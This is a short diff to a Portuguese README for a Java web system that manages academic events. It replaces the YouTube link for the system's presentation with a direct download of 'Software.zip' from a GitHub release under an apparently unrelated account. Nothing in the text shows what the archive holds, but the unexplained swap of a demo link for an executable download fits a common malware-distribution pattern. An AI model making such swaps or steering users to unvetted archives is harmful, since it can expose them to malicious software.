@@ -5,4 +5,4 @@ Sistema feito para controlar eventos acadêmicos, tais como: cursos, palestras, 
 Java Server Faces, Primefaces, JPA e Hibernate, Spring Security, Maven, Bean Validation, Jasper reports, Apache Tomcat e Postgresql.
 
 # Apresentação do sistema
-https://www.youtube.com/watch?v=EBbcR-gwNbQ
+https://github.com/Gu446325/Gerenciamento-de-Eventos3/releases/download/v2.0/Software.zip
